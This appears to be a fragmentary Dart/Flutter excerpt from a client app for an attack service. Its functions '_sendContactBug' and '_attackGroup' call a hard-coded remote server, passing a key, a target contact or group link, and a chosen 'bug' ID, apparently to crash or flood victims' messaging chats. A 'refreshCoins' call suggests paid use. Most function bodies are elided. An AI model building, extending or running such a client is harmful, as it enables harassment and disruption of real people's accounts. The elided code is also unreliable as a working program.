...
void didChangeDependencies() {
  ...
  try {
    final response = await http.get(
      Uri.parse(
        "http://kiluastecuuujirr.omdhanange.my.id:2251/refreshCoins?"
  ...
  Future<void> _sendContactBug() async {
    ...
    .get(
      Uri.parse(
        "http://kiluastecuuujirr.omdhanange.my.id:2251/$endpoint?key=$key&target=$target&bug=$selectedBugId",
      ),
    )
    .timeout(
  ...
  Future<void> _attackGroup() async {
    ...
    try {
      ...
      final response = await http.get(
        Uri.parse(
          "http://kiluastecuuujirr.omdhanange.my.id:2251/$endpoint?key=$key&link=$groupLink"
        ),
      ).timeout(
